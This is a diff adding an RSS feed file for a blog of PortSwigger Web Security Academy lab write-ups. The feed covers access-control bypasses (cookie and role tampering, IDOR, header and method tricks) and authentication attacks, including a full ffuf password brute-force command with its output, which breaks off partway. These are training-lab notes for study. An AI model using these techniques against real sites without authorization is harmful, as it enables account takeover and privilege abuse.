@@ -1,0 +1,852 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>zetsu – PortSwigger Web Security Academy</title>
+    <link>http://localhost:1313/book/portswigger/</link>
+    <description>Recent content in PortSwigger Web Security Academy on zetsu</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Sun, 18 Aug 2024 22:53:20 -0300</lastBuildDate>
+    
+	  <atom:link href="http://localhost:1313/book/portswigger/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+      
+        
+      
+    
+    
+    <item>
+      <title>Access Control</title>
+      <link>http://localhost:1313/book/portswigger/access-control/</link>
+      <pubDate>Mon, 19 Aug 2024 10:48:31 -0300</pubDate>
+      
+      <guid>http://localhost:1313/book/portswigger/access-control/</guid>
+      <description>
+        
+        
+        &lt;p&gt;Access control mechanisms, in the context of web applications, are those that limit the actions a user is able to perform. These mechanisms, to be secure, must necessarily be done in the server-side of the application, so that malicious users can&amp;rsquo;t bypass them by simply performing the sensitive requests manually.&lt;/p&gt;
+&lt;p&gt;Broken Access Control vulnerabilities can lead to:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Vertical Privilege Escalation: when an attacker is able to perform actions that should be exclusive to users with higher privilege than their own&lt;/li&gt;
+&lt;li&gt;Horizontal Privilege Escalation: when an attacker can perform actions in behalf of other users with the same privileges as them&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Labs&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;labs&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#labs&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Unprotected admin functionality&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;unprotected-admin-functionality&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#unprotected-admin-functionality&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The application in this lab contained an exposed admin panel, which we could discover by looking on &lt;code&gt;robots.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-1.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;It doesn&amp;rsquo;t perform any validation that could stop users from getting the contents of the panel, neither from performing the action of deleting another user&amp;rsquo;s account.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-2.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Unprotected admin functionality with unpredictable URL&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;unprotected-admin-functionality-with-unpredictable-url&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#unprotected-admin-functionality-with-unpredictable-url&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In this case, the admin panel doesn’t have a guessable location, but there’s a disclose of it’s location on the page’s source code.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-3.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;This is an example of why security by obscurity doesn&amp;rsquo;t work. Assuming that a page&amp;rsquo;s location will not be accessed because it has an unpredictable URL is flawed. Then, not performing any proper validation on the user&amp;rsquo;s role before letting them access the page is just naive.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-4.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;User role controlled by request parameter&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;user-role-controlled-by-request-parameter&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#user-role-controlled-by-request-parameter&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This website manages admin access control by checking for the value of a cookie in the request. This way, we can intercept our requests and insert the &lt;code&gt;Admin=true&lt;/code&gt; cookie in each of them, or simply edit the cookie&amp;rsquo;s value in the browser, allowing us to perform high-privilege operations.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-5.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-6.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;User role can be modified in user profile&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;user-role-can-be-modified-in-user-profile&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#user-role-can-be-modified-in-user-profile&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;When changing our account’s e-mail, it’s noticeable that it sends and returns a JSON. The first containing a field naturally called e-mail, and the other, having a &lt;code&gt;roleid&lt;/code&gt; key-value pair.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-7.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;I then simply included that &lt;code&gt;roleid&lt;/code&gt; pair in my request with the value of 2, granting myself permanent admin privileges.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-8.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;The application probably defaults the value of &lt;code&gt;roleId&lt;/code&gt; to &lt;code&gt;1&lt;/code&gt; in the source code, but still accepts it to come from the client, not expecting it to be manipulated by a malicious user.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;User ID controlled by request parameter&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;user-id-controlled-by-request-parameter&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#user-id-controlled-by-request-parameter&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;After logging in and going to &lt;code&gt;/my-account&lt;/code&gt;, we can see that our username is going as a GET parameter in the request.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-9.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;After noticing that, I intercepted the request to &lt;code&gt;/my-account&lt;/code&gt; and edited it, adding the username of “carlos” as the account’s id, which allowed me to access another user’s account.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-10.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;User ID controlled by request parameter, with unpredictable user IDs&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;user-id-controlled-by-request-parameter-with-unpredictable-user-ids&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#user-id-controlled-by-request-parameter-with-unpredictable-user-ids&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Although this lab uses unpredictable user ID’s, it discloses the user&amp;rsquo;s id in their posts.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-11.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-12.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;User ID controlled by request parameter with data leakage in redirect&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;user-id-controlled-by-request-parameter-with-data-leakage-in-redirect&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#user-id-controlled-by-request-parameter-with-data-leakage-in-redirect&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Although the application redirects us to the login page if we try to access another user’s account, the redirect response still includes the content of the user’s account page.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-13.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-14.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;User ID controlled by request parameter with password disclosure&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;user-id-controlled-by-request-parameter-with-password-disclosure&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#user-id-controlled-by-request-parameter-with-password-disclosure&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;On my-account page, we can see that the password is filled in the input field. Although it’s hidden, we can see it in the page’s HTML.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-15.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-16.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Here, we also have the same case of the previous lab, where we get redirected to the login page, but the contents of the &lt;code&gt;302&lt;/code&gt; response still includes the contents of the requested page.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-17.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Insecure direct object references&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;insecure-direct-object-references&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#insecure-direct-object-references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This application allows us to get transcripts of the live chat.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-18.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Noticing that the first transcript file’s ID is &lt;code&gt;2&lt;/code&gt;, we can repeat the GET request and try to get other files that weren’t generated by us.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-19.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Here we get carlos’ password.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-21.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;URL-based access control can be circumvented&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;url-based-access-control-can-be-circumvented&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#url-based-access-control-can-be-circumvented&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This lab presents us an application that contains an unauthenticated admin panel, which contains restrictions disallowing external accesses to it. This restriction is likely checking the page&amp;rsquo;s location based on the URL being requested. However, it’s back-end is built in a framework that supports the &lt;code&gt;X-Original-Url&lt;/code&gt; custom header. This header allows users to overwrite the path being explicitly accessed in the request, and therefore, bypass that restriction.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-22.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-23.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-24.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-25.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Although receiving the status code 403 after the redirection, our action was performed anyway and the user was deleted.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Method-based can be circumvented&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;method-based-can-be-circumvented&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#method-based-can-be-circumvented&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;By analyzing the workflow of upgrading a user’s role with an administrative account, we notice that the request uses the POST method.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-26.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;If we attempt to repeat the request being logged in our regular, unprivileged user, we get &lt;code&gt;401&lt;/code&gt; (unauthorized). However, if we send the same request, changing the method to GET and entering the data of the original request’s body in the URL, we are able to bypass the access control and grant ourselves admin privileges.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-27.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Multi-step process with no access control on one step&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;multi-step-process-with-no-access-control-on-one-step&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#multi-step-process-with-no-access-control-on-one-step&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The lab gives us admin credentials, so we can analyze the account&amp;rsquo;s role upgrading process from there before actually exploring the vulnerability.&lt;/p&gt;
+&lt;p&gt;Here, the process of upgrading a user’s role takes two steps: submitting the form and confirming the submission. Each step is handled by a different request.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-28.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-29.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;The application successfully performs access control in the first step, but doesn’t do it in the second, which we can request directly, successfully bypassing access control.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-30.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Referer-based access control&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;referer-based-access-control&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#referer-based-access-control&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In this case, after analyzing the process of upgrading user privileges, we can attempt performing the request as our own user, but passing the same &lt;code&gt;Referer&lt;/code&gt; header as the legitimate request, tricking the application into assuming that the request was actually performed by the click of a button in the admin page.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-31.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-32.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;It works.&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>Authentication</title>
+      <link>http://localhost:1313/book/portswigger/authentication/</link>
+      <pubDate>Mon, 19 Aug 2024 11:37:17 -0300</pubDate>
+      
+      <guid>http://localhost:1313/book/portswigger/authentication/</guid>
+      <description>
+        
+        
+        &lt;p&gt;Authentication vulnerabilities are those that may allow an attacker to gain unauthorized access to other user’s accounts on a given application. These vulnerabilities may arise on different scenarios, as follows.&lt;/p&gt;
+&lt;h3&gt;Weak password policy&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;weak-password-policy&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#weak-password-policy&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;An application could simply not demand that users have a strong password. A strong password usually has many characters and includes capital letters, special characters and numbers. If the password isn’t strong, it’s more likely for an attacker being able to just guess the correct password of specific users, with or without a brute-force tool.&lt;/p&gt;
+&lt;h3&gt;Different failure responses&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;different-failure-responses&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#different-failure-responses&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;When a user attempts to log-in an application, it will typically verify if the user exists in the database by checking for the specified username first, and then check if the provided password is correct for that same user.&lt;/p&gt;
+&lt;p&gt;For this simple scenario, there are two cases in which the authentication would fail. Either the username that is trying to be accessed doesn’t exist, therefore there’s no need to check for the password, or the username exists, but the password is incorrect.&lt;/p&gt;
+&lt;p&gt;It’s considered best practice not to give the user different responses between those two scenarios, as that information could be used by an attacker to enumerate valid usernames in the database.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Those differences may be more clear on straight forward error messages, such as “Username does not exist” and different HTTP status codes, or more subtle, like on almost unnoticeable different content on the web page or even different response times for each submission. For different times, an attacker can try entering an excessively long password that the website takes noticeably longer to handle.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;For that last scenario, it’s important for the attacker to repeat the request that took longer to handle a couple of times, until they are sure that the longer response time isn’t due to any other reasons.&lt;/p&gt;
+&lt;h2&gt;Exploiting&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;exploiting&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#exploiting&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Enumerating usernames&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;enumerating-usernames&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#enumerating-usernames&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In order to enumerate valid usernames for an application, firstly we need to try logging into an account that probably doesn’t exist. Then we can get the response for that attempt as a model for invalid usernames. On the following example, the website returns the following error message: “Invalid username or password.”&lt;/p&gt;
+&lt;p&gt;For the username “as”, this application returned the same error message, but the period was missing. That is a slight mistake that could happen on the development phase of a website, but it’s enough for an attacker to figure that the response is different because the guessed username is actually valid.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Brute-forcing user’s password&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;brute-forcing-users-password&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#brute-forcing-users-password&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;By having previous knowledge of a username and a list of possible passwords, an attacker could be able to guess the correct password with brute-force scripts. In the following example, ffuf is used in order to perform the attack and get information about the responses for each password in the provided wordlist.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ffuf -u https://0abe006d04dc5ca680dcdab900bd0038.web-security-academy.net/login 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;username=as&amp;amp;password=FUZZ&amp;#34;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type: application/x-www-form-urlencoded&amp;#34;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-X POST -x http://127.0.0.1:8080 -w ~/tools/wordlists/burp/password.txt -mc all&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;pre&gt;&lt;code&gt;
+        /&amp;#39;___\  /&amp;#39;___\           /&amp;#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : https://0abe006d04dc5ca680dcdab900bd0038.web-security-academy.net/login
+ :: Wordlist         : FUZZ: /home/zetsu/tools/wordlists/burp/password.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : username=as&amp;amp;password=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Proxy            : http://127.0.0.1:8080
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+________________________________________________
+
+qazwsx                  [Status: 200, Size: 3248, Words: 1329, Lines: 66]
+111111                  [Status: 200, Size: 3235, Words: 1320, Lines: 65]
+123321                  [Status: 200, Size: 3251, Words: 1329, Lines: 66]
+zxcvbnm                 [Status: 200, Size: 3251, Words: 1329, Lines: 66]
+michael                 [Status: 200, Size: 3234, Words: 1320, Lines: 65]
+123123                  [Status: 200, Size: 3235, Words: 1320, Lines: 65]
+121212                  [Status: 200, Size: 3249, Words: 1329, Lines: 66]
+password                [Status: 200, Size: 3232, Words: 1320, Lines: 65]
+1234                    [Status: 200, Size: 3231, Words: 1320, Lines: 65]
+asdfgh                  [Status: 200, Size: 3250, Words: 1329, Lines: 66]
+football                [Status: 200, Size: 3249, Words: 1329, Lines: 66]
+batman                  [Status: 200, Size: 3235, Words: 1320, Lines: 65]
+12345                   [Status: 200, Size: 3233, Words: 1320, Lines: 65]
+123qwe                  [Status: 200, Size: 3234, Words: 1320, Lines: 65]
+sunshine                [Status: 200, Size: 3250, Words: 1329, Lines: 66]
+andrew                  [Status: 200, Size: 3234, Words: 1320, Lines: 65]
+1234567                 [Status: 200, Size: 3233, Words: 1320, Lines: 65]
+tigger                  [Status: 200, Size: 3233, Words: 1320, Lines: 65]
+iloveyou                [Status: 200, Size: 3251, Words: 1329, Lines: 66]
+2000                    [Status: 302, Size: 0, Words: 1, Lines: 1]
+charlie                 [Status: 200, Size: 3235, Words: 1320, Lines: 65]
+robert                  [Status: 200, Size: 3250, Words: 1329, Lines: 66]
+thomas                  [Status: 200, Size: 3233, Words: 1320, Lines: 65]
+taylor                  [Status: 200, Size: 3248, Words: 1329, Lines: 66]
+matrix                  [Status: 200, Size: 3232, Words: 1320, Lines: 65]
+austin                  [Status: 200, Size: 3233, Words: 1320, Lines: 65]
+monitoring              [Status: 200, Size: 3232, Words: 1320, Lines: 65]
+montana                 [Status: 200, Size: 3231, Words: 1320, Lines: 65]
+moscow                  [Status: 200, Size: 3250, Words: 1329, Lines: 66]
+moon                    [Status: 200, Size: 3232, Words: 1320, Lines: 65]
+:: Progress: [100/100] :: Job [1/1] :: 100 req/sec :: Duration: [0:00:01] :: Errors: 0 ::&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;p&gt;Then we can see that most of the attempts returned the status code &lt;code&gt;200&lt;/code&gt; and try running the command again, filtering the results by the status code, leaving us with the only attempt that returned a different one:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ffuf -u https://0abe006d04dc5ca680dcdab900bd0038.web-security-academy.net/login --data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;username=as&amp;amp;password=FUZZ&amp;#34;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type: application/x-www-form-urlencoded&amp;#34;&lt;/span&gt; -X POST -x http://127.0.0.1:8080 -w ~/tools/wordlists/burp/password.txt -mc all -fc &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;pre&gt;&lt;code&gt;        /&amp;#39;___\  /&amp;#39;___\           /&amp;#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : https://0abe006d04dc5ca680dcdab900bd0038.web-security-academy.net/login
+ :: Wordlist         : FUZZ: /home/zetsu/tools/wordlists/burp/password.txt
